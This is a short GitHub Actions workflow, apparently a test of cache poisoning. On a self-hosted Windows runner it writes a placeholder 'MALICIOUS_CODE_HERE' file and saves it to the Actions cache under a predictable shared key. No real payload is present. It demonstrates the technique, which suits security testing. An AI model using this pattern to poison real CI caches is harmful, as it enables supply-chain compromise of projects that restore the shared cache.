name: cache-poison-test
on: workflow_dispatch
jobs:
  poison:
    runs-on: [self-hosted, Windows, X64]
    steps:
      - name: Create Malicious Cache
        shell: cmd
        run: |
          echo Creating poisoned payload...
          mkdir cache-test
          echo MALICIOUS_CODE_HERE > cache-test\payload.txt
          echo Cache created at: %CD%\cache-test
          
      - name: Save to Cache
        uses: actions/cache/save@v3
        with:
          path: cache-test
          key: shared-cache-${{ github.repository }}-v1
